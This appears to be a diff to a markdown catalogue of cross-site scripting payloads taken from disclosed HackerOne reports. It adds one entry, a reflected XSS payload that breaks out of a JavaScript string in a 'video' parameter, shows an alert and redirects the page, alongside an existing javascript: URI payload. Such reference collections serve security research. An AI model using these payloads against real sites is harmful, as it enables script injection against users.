@@ -1,6 +1,6 @@
 # Cross-site Scripting
 
-813 payloads from disclosed reports.
+814 payloads from disclosed reports.
 
 ## Reflected XSS via javascript: URI in referer parameter
 
@@ -7317,6 +7317,20 @@ https://███████/en/embeddedAuthRedirect.html?auth=javascript:alert
 
 **Parameter:** `auth`
 — [Reflected Xss](https://hackerone.com/reports/758854) · U.S. Dept Of Defense · [0xelkomy](https://hackerone.com/0xelkomy)
+
+
+## Reflected XSS payload breaking out of a JavaScript context via the 'video' parameter
+
+### `12e32880`
+
+```
+video");
+alert('Hacked by k0x');
+setTimeout(()=>location.href='████',5000);//
+```
+
+**Parameter:** `video`
+— [CSRF to XSS](https://hackerone.com/reports/2736979) · U.S. Dept Of Defense · [k0x](https://hackerone.com/k0x)
 
 
 ## Reflected XSS via payload query parameter used in cache poisoning
